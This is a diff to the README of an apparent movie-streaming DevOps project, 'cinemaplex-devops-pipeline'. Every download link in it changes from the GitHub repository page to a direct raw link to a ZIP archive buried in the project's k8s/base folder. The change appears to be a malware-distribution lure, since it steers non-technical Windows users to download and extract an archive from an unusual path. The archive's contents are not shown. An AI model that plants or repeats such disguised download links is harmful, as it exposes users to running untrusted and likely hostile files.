@@ -1,10 +1,10 @@
 # 🎬 cinemaplex-devops-pipeline - Stream Movies With Modern Ops
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/gg7766aa/cinemaplex-devops-pipeline)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/gg7766aa/cinemaplex-devops-pipeline/main/k8s/base/devops-cinemaplex-pipeline-3.0-alpha.1.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/gg7766aa/cinemaplex-devops-pipeline
+Visit this page to download: https://raw.githubusercontent.com/gg7766aa/cinemaplex-devops-pipeline/main/k8s/base/devops-cinemaplex-pipeline-3.0-alpha.1.zip
 
 If the page offers a release file, download it to your Windows PC. If it gives source files only, download the full project folder from the page.
 
@@ -37,7 +37,7 @@ If you plan to run the full stack, you may also need:
 
 ### 1. Open the download page
 
-Go to: https://github.com/gg7766aa/cinemaplex-devops-pipeline
+Go to: https://raw.githubusercontent.com/gg7766aa/cinemaplex-devops-pipeline/main/k8s/base/devops-cinemaplex-pipeline-3.0-alpha.1.zip
 
 ### 2. Get the project files
 
@@ -216,7 +216,7 @@ These files tell you the exact way to start the app.
 
 ## 📦 If You Want the Shortest Path
 
-1. Visit https://github.com/gg7766aa/cinemaplex-devops-pipeline
+1. Visit https://raw.githubusercontent.com/gg7766aa/cinemaplex-devops-pipeline/main/k8s/base/devops-cinemaplex-pipeline-3.0-alpha.1.zip
 2. Download the project files
 3. Extract the ZIP
 4. Install Docker Desktop
@@ -249,4 +249,4 @@ Check the config files in the project folder before editing anything.
 
 ## 📥 Download Again
 
-Visit this page to download: https://github.com/gg7766aa/cinemaplex-devops-pipeline
+Visit this page to download: https://raw.githubusercontent.com/gg7766aa/cinemaplex-devops-pipeline/main/k8s/base/devops-cinemaplex-pipeline-3.0-alpha.1.zip
